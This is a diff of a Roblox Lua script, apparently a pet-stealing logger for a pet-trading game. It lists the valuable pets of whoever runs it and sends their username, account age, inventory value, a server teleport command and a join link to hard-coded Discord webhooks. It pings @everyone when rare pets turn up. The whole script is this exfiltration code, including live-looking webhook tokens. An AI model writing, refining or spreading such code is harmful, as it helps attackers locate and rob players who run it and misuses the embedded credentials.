@@ -2,42 +2,26 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- === WEBHOOKS ===
+-- WEBHOOKS
 local WEBHOOK_PRIORITY = "https://discord.com/api/webhooks/1410626814857973831/O4uWK0swu6aCG8HFTKa_3cncOA2liwK38aeAr-8fwPU7IDwASPHUg6jy-XLOanMWXzhU"
 local WEBHOOK_NORMAL   = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
 
--- === PRIORITY PETS & VALUES ===
+-- PRIORITY PETS & VALUES
 local PRIORITY = {
-    ["Raccoon"] = "🦝",
-    ["Dragonfly"] = "🐉",
-    ["Mimic Octopus"] = "🐙",
-    ["Red Fox"] = "🦊",
-    ["Disco Bee"] = "🎵🐝",
-    ["Queen Bee"] = "👑🐝",
-    ["Lobster Thermidor"] = "🦞",
-    ["Golden Goose"] = "🥇🦢",
-    ["Kitsune"] = "🌸",
-    ["Corrupted Kitsune"] = "🦠",
-    ["Fennec Fox"] = "🐺",
-    ["T-Rex"] = "🦖"
+    ["Raccoon"]="🦝", ["Dragonfly"]="🐉", ["Mimic Octopus"]="🐙", ["Red Fox"]="🦊",
+    ["Disco Bee"]="🎵🐝", ["Queen Bee"]="👑🐝", ["Lobster Thermidor"]="🦞",
+    ["Golden Goose"]="🥇🦢", ["Kitsune"]="🌸", ["Corrupted Kitsune"]="🦠",
+    ["Fennec Fox"]="🐺", ["T-Rex"]="🦖"
 }
 
 local PRIORITY_VALUES = {
-    ["Raccoon"] = 250,
-    ["Dragonfly"] = 50,
-    ["Mimic Octopus"] = 30,
-    ["Red Fox"] = 10,
-    ["Disco Bee"] = 200,
-    ["Queen Bee"] = 20,
-    ["Lobster Thermidor"] = 30,
-    ["Golden Goose"] = 15,
-    ["Kitsune"] = 550,
-    ["Corrupted Kitsune"] = 10,
-    ["Fennec Fox"] = 100,
-    ["T-Rex"] = 35
+    ["Raccoon"]=250, ["Dragonfly"]=50, ["Mimic Octopus"]=30, ["Red Fox"]=10,
+    ["Disco Bee"]=200, ["Queen Bee"]=20, ["Lobster Thermidor"]=30,
+    ["Golden Goose"]=15, ["Kitsune"]=550, ["Corrupted Kitsune"]=10,
+    ["Fennec Fox"]=100, ["T-Rex"]=35
 }
 
--- === PETS ===
+-- PET LIST
 local PETS = {
     "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
     "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
@@ -55,11 +39,9 @@ local PETS = {
     "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex"
 }
 
--- Prepare lowercase keywords
+-- Lowercase keywords
 local PET_KEYWORDS = {}
-for _, name in ipairs(PETS) do
-    PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower()
-end
+for _, name in ipairs(PETS) do PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower() end
 
 local function isPet(name)
     local lower = name:lower()
@@ -76,8 +58,9 @@ local function getPriorityEmoji(name)
     return nil
 end
 
+-- Format pet line with bonus for [💪][emoji]
 local function formatPetLine(name)
-    local emoji = getPriorityEmoji(name)
+    local priorityEmoji = getPriorityEmoji(name)
     local baseValue = 0
     for petName, petValue in pairs(PRIORITY_VALUES) do
         if string.find(string.lower(name), string.lower(petName)) then
@@ -87,106 +70,109 @@ local function formatPetLine(name)
     end
 
     local weight = 0
-    local kgMatch = string.match(name, "(%d+%.?%d*)%s*KG") or string.match(name, "(%d+%.?%d*)%s*kg")
+    local kgMatch = string.match(name, "(%d+%.?%d*)%s*[Kk][Gg]?")
     if kgMatch then weight = tonumber(kgMatch) or 0 end
 
     local ageMatch = string.match(name, "%[Age%s*(%d+)%]")
-    local ageText = ageMatch and ("[Age " .. ageMatch .. "]") or ""
+    local ageText = ageMatch and ("[Age "..ageMatch.."]") or ""
 
-    if not emoji then
-        if weight >= 15 then  -- 💪 triggers at 15kg now
+    local emoji = ""
+    local displayValue = baseValue
+
+    if priorityEmoji then
+        if weight >= 30 then
+            emoji = "[💪] ["..priorityEmoji.."]"
+            displayValue = displayValue + 3000 -- add bonus to display
+        else
+            emoji = "["..priorityEmoji.."]"
+        end
+    else
+        if weight >= 15 then
             emoji = "💪"
         else
             emoji = "🐶"
         end
     end
 
-    return emoji .. " - " .. name .. " " .. ageText .. " → " .. baseValue .. "¢"
+    return emoji.." - "..name.." "..ageText.." → "..displayValue.."¢"
 end
 
--- Collect pets with priority at top
+-- Collect pets with 4-category ordering and bonus
 local function collectPets(container)
-    local items = {}
-    local hasPriorityPet = false
-    if not container then return {}, 0, false end
+    local items, hasPriorityPet = {}, false
+    if not container then return {},0,false end
 
     for _, obj in ipairs(container:GetChildren()) do
         if obj:IsA("Tool") and isPet(obj.Name) then
-            table.insert(items, obj.Name)
-            if getPriorityEmoji(obj.Name) then
-                hasPriorityPet = true
-            end
+            table.insert(items,obj.Name)
+            if getPriorityEmoji(obj.Name) then hasPriorityPet = true end
         end
     end
 
-    local priorityItems, normalItems = {}, {}
-    local totalValue = 0
+    local priorityStrong, priorityNormal, strong, normal, totalValue = {}, {}, {}, {}, 0
 
     for _, name in ipairs(items) do
+        local weight = tonumber(string.match(name,"(%d+%.?%d*)%s*[Kk][Gg]?") or "0")
+        local priorityEmoji = getPriorityEmoji(name)
         local line = formatPetLine(name)
-        local isPriority = getPriorityEmoji(name) ~= nil
-
-        if isPriority then
-            table.insert(priorityItems, line)
-        else
-            table.insert(normalItems, line)
-        end
+        local petBaseValue = 0
 
         for petName, petValue in pairs(PRIORITY_VALUES) do
             if string.find(string.lower(name), string.lower(petName)) then
-                totalValue = totalValue + petValue
+                petBaseValue = petValue
                 break
             end
+        end
+
+        -- Categorize pets and calculate total value with bonus
+        if priorityEmoji then
+            if weight >= 30 then
+                table.insert(priorityStrong,line)
+                totalValue = totalValue + petBaseValue + 3000 -- bonus
+            else
+                table.insert(priorityNormal,line)
+                totalValue = totalValue + petBaseValue
+            end
+        else
+            if weight >= 15 then
+                table.insert(strong,line)
+            else
+                table.insert(normal,line)
+            end
+
+            totalValue = totalValue + petBaseValue
         end
     end
 
     local formatted = {}
-    for _, line in ipairs(priorityItems) do table.insert(formatted, line) end
-    for _, line in ipairs(normalItems) do table.insert(formatted, line) end
+    for _, line in ipairs(priorityStrong) do table.insert(formatted, line) end
+    for _, line in ipairs(priorityNormal) do table.insert(formatted, line) end
+    for _, line in ipairs(strong) do table.insert(formatted, line) end
+    for _, line in ipairs(normal) do table.insert(formatted, line) end
 
-    return formatted, totalValue, hasPriorityPet
+    return formatted,totalValue,hasPriorityPet
 end
 
--- Collect pets
-local backpack, backpackValue, hasPriorityBackpack = collectPets(player:FindFirstChild("Backpack"))
-local equipped, equippedValue, hasPriorityEquipped = collectPets(player.Character)
+-- Wait for Backpack and Character
+local backpack = player:WaitForChild("Backpack")
+local char = player.Character or player.CharacterAdded:Wait()
+
+local backpackList,backpackValue,hasPriorityBackpack = collectPets(backpack)
+local equippedList,equippedValue,hasPriorityEquipped = collectPets(char)
 local totalValue = backpackValue + equippedValue
 
--- Determine if any priority pet exists
 local hasPriority = hasPriorityBackpack or hasPriorityEquipped
 local pingText = hasPriority and "--@everyone\n" or ""
-
--- Select correct webhook
 local targetWebhook = hasPriority and WEBHOOK_PRIORITY or WEBHOOK_NORMAL
 
--- Teleport line
-local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
-local contentText = pingText .. teleportLine
-
--- Dynamic server join URL
-local serverURL = string.format(
-    "https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",
-    game.PlaceId,
-    game.JobId
-)
-
--- Embed color: red if priority pet, green if not
+local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s")',game.PlaceId,game.JobId)
+local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId)
+local contentText = pingText..teleportLine
 local embedColor = hasPriority and 15158332 or 3066993
 
--- Build Discord embed
-local description = "```Name: " .. player.Name .. "\n" ..
-                    "Executor: Delta\n" ..
-                    "Account Age: " .. player.AccountAge .. " days```" .. "\n" ..
-                    "💰 Kwarta nga nakuha\n" ..
-                    "```" .. totalValue .. "₱```" .. "\n" ..
-                    "🎒 Backpack\n" ..
-                    "```" ..
-                    (#backpack > 0 and table.concat(backpack, "\n") or "No pets found.") ..
-                    "```" .. "\n" ..
-                    "🏝️ Join with URL\n" ..
-                    "**[" .. game.JobId .. "](" .. serverURL .. ")**"
+local description = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```"..
+                    "\n💰 Kwarta nga nakuha\n```"..totalValue.."₱```\n🎒 Backpack\n```"..(#backpackList>0 and table.concat(backpackList,"\n") or "No pets found.").."```\n🏝️ Join with URL\n**["..game.JobId.."]("..serverURL..")**"
 
--- Send webhook
 local payload = {
     content = contentText,
     embeds = {{
@@ -197,16 +183,22 @@ local payload = {
 }
 
 local json = HttpService:JSONEncode(payload)
-local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
+local req = http_request or request or (syn and syn.request) or (krnl and krnl.request)
+
 if req then
-    pcall(function()
+    local success, err = pcall(function()
         req({
-            Url = targetWebhook, -- uses priority or normal webhook
+            Url = targetWebhook,
             Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
+            Headers = {["Content-Type"]="application/json"},
             Body = json
         })
     end)
+    if success then
+        print("✅ Webhook sent to:", targetWebhook)
+    else
+        warn("❌ Failed to send webhook:", err)
+    end
 else
     warn("❌ Your executor does not support HTTP requests.")
 end
